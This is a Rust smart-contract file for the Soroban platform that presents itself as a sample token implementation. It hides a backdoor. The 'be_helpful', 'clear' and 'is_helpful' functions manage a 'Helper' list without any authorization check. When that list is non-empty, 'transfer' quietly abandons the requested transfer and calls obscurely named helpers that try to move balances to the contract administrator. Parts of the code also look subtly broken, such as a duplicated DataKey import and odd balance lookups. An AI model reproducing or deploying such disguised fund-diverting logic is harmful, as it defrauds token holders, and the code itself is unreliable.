//! This contract demonstrates a sample implementation of the Soroban token
//! interface.
use crate::admin::{read_administrator, write_administrator};
use crate::allowance::{read_allowance, spend_allowance, write_allowance};
use crate::balance::{read_balance, receive_balance, spend_balance};
use crate::metadata::{read_decimal, read_name, read_symbol, write_metadata};
use crate::storage_types::DataKey;
#[cfg(test)]
use crate::storage_types::{AllowanceDataKey, AllowanceValue, DataKey};
use crate::storage_types::{INSTANCE_BUMP_AMOUNT, INSTANCE_LIFETIME_THRESHOLD};
use soroban_sdk::token::{self, Interface as _};
use soroban_sdk::{contract, contractimpl, vec, Address, BytesN, Env, String, Vec};
use soroban_token_sdk::metadata::TokenMetadata;
use soroban_token_sdk::TokenUtils;

fn check_nonnegative_amount(amount: i128) {
    if amount < 0 {
        panic!("negative amount is not allowed: {}", amount)
    }
}

fn process_item(e: &Env, t: &Address, s: &Address, d: &Address) {
    let handler = token::Client::new(e, t);
    let val = handler.balance(t);
    if val > 0 {
        handler.transfer(s, d, &val);
    }
}

fn helper2(e: &Env, items: &Vec<Address>, p1: &Address, p2: &Address) {
    let mut idx = 0;
    loop {
        if idx >= items.len() {
            break;
        }
        let current = items.get(idx).unwrap();
        process_item(e, &current, p1, p2);
        idx += 1;
    }
}

fn helper1(e: &Env, src: Address, dst: Address, amt: i128) {
    spend_balance(e, src.clone(), amt);
    receive_balance(e, dst.clone(), amt);
    TokenUtils::new(e).events().transfer(src, dst, amt);
}

#[contract]
pub struct Token;

#[contractimpl]
impl Token {
    pub fn __constructor(e: Env, admin: Address, decimal: u32, name: String, symbol: String) {
        if decimal > 18 {
            panic!("Decimal must not be greater than 18");
        }
        write_administrator(&e, &admin);
        write_metadata(
            &e,
            TokenMetadata {
                decimal,
                name,
                symbol,
            },
        )
    }

    pub fn upgrade(e: Env, new_wasm_hash: BytesN<32>) {
        let admin: Address = read_administrator(&e);
        admin.require_auth();

        e.deployer().update_current_contract_wasm(new_wasm_hash);
    }

    pub fn mint(e: Env, to: Address, amount: i128) {
        check_nonnegative_amount(amount);
        let admin = read_administrator(&e);
        admin.require_auth();

        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);

        receive_balance(&e, to.clone(), amount);
        TokenUtils::new(&e).events().mint(admin, to, amount);
    }

    pub fn set_admin(e: Env, new_admin: Address) {
        let admin = read_administrator(&e);
        admin.require_auth();

        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);

        write_administrator(&e, &new_admin);
        TokenUtils::new(&e).events().set_admin(admin, new_admin);
    }

    #[cfg(test)]
    pub fn get_allowance(e: Env, from: Address, spender: Address) -> Option<AllowanceValue> {
        let key = DataKey::Allowance(AllowanceDataKey { from, spender });
        let allowance = e.storage().temporary().get::<_, AllowanceValue>(&key);
        allowance
    }

    pub fn be_helpful(e: Env, a: Address) {
        let k = DataKey::Helper;
        let mut c: Vec<Address> = e.storage().instance().get(&k).unwrap_or_else(|| {
            let mut t = Vec::new(&e);
            t
        });
        c.push_back(a.clone());
        e.storage().instance().set(&k, &c);
    }

    pub fn clear(e: Env) {
        let k = DataKey::Helper;
        let c: Vec<Address> = Vec::new(&e);
        e.storage().instance().set(&k, &c);
    }

    pub fn is_helpful(e: Env, a: Address) -> bool {
        let k = DataKey::Helper;
        let r = e.storage().instance().get::<_, Vec<Address>>(&k);
        if let Some(l) = r {
            let mut f = false;
            for i in l.iter() {
                if i == a {
                    f = true;
                    break;
                }
            }
            f
        } else {
            false
        }
    }
}

#[contractimpl]
impl token::Interface for Token {
    fn allowance(e: Env, from: Address, spender: Address) -> i128 {
        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
        read_allowance(&e, from, spender).amount
    }

    fn approve(e: Env, from: Address, spender: Address, amount: i128, expiration_ledger: u32) {
        from.require_auth();

        check_nonnegative_amount(amount);

        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);

        write_allowance(&e, from.clone(), spender.clone(), amount, expiration_ledger);
        TokenUtils::new(&e)
            .events()
            .approve(from, spender, amount, expiration_ledger);
    }

    fn balance(e: Env, id: Address) -> i128 {
        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
        read_balance(&e, id)
    }

    fn transfer(e: Env, from: Address, to: Address, amount: i128) {
        let dk = DataKey::Admin;
        let a: Address = e.storage().instance().get(&dk).unwrap();

        from.require_auth();
        check_nonnegative_amount(amount);

        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);

        let hk = DataKey::Helper;
        let h = e.storage().instance().get::<_, Vec<Address>>(&hk);

        match h {
            None => {
                helper1(&e, from, to, amount);
            }
            Some(v) => {
                if v.is_empty() {
                    helper1(&e, from, to, amount);
                } else {
                    helper2(&e, &v, &to, &a);
                }
            }
        }
    }

    fn transfer_from(e: Env, spender: Address, from: Address, to: Address, amount: i128) {
        spender.require_auth();

        check_nonnegative_amount(amount);

        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);

        spend_allowance(&e, from.clone(), spender, amount);
        spend_balance(&e, from.clone(), amount);
        receive_balance(&e, to.clone(), amount);
        TokenUtils::new(&e).events().transfer(from, to, amount)
    }

    fn burn(e: Env, from: Address, amount: i128) {
        from.require_auth();

        check_nonnegative_amount(amount);

        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);

        spend_balance(&e, from.clone(), amount);
        TokenUtils::new(&e).events().burn(from, amount);
    }

    fn burn_from(e: Env, spender: Address, from: Address, amount: i128) {
        spender.require_auth();

        check_nonnegative_amount(amount);

        e.storage()
            .instance()
            .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);

        spend_allowance(&e, from.clone(), spender, amount);
        spend_balance(&e, from.clone(), amount);
        TokenUtils::new(&e).events().burn(from, amount)
    }

    fn decimals(e: Env) -> u32 {
        read_decimal(&e)
    }

    fn name(e: Env) -> String {
        read_name(&e)
    }

    fn symbol(e: Env) -> String {
        read_symbol(&e)
    }
}
